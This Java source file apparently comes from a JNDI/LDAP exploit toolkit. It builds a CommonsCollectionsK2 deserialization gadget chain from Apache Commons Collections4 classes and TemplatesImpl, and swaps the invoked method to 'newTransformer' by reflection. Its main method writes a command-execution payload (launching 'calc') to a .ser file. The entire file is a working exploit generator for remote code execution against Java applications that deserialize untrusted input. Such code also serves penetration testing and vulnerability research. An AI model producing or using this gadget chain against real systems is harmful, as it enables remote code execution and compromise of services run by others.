package com.feihong.ldap.gadgets;

import com.feihong.ldap.enumtypes.PayloadType;
import com.feihong.ldap.gadgets.utils.Gadgets;
import com.feihong.ldap.gadgets.utils.Reflections;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.keyvalue.TiedMapEntry;
import org.apache.commons.collections4.map.LazyMap;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollectionsK2 {
    public static void main(String[] args) throws Exception {
        byte[] bytes = getBytes(PayloadType.command, "calc");
        FileOutputStream fous = new FileOutputStream("4444.ser");
        fous.write(bytes);
        fous.close();
    }

    public static byte[] getBytes(PayloadType type, String... param) throws Exception {
        Object tpl = Gadgets.createTemplatesImpl(type, param);
        InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);

        HashMap<String, String> innerMap = new HashMap<String, String>();
        Map m = LazyMap.lazyMap(innerMap, transformer);

        Map outerMap = new HashMap();
        TiedMapEntry tied = new TiedMapEntry(m, tpl);
        outerMap.put(tied, "t");
        // clear the inner map data, this is important
        innerMap.clear();

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");

        //序列化
        ByteArrayOutputStream baous = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baous);
        oos.writeObject(outerMap);
        byte[] bytes = baous.toByteArray();
        oos.close();

        return bytes;
    }
}
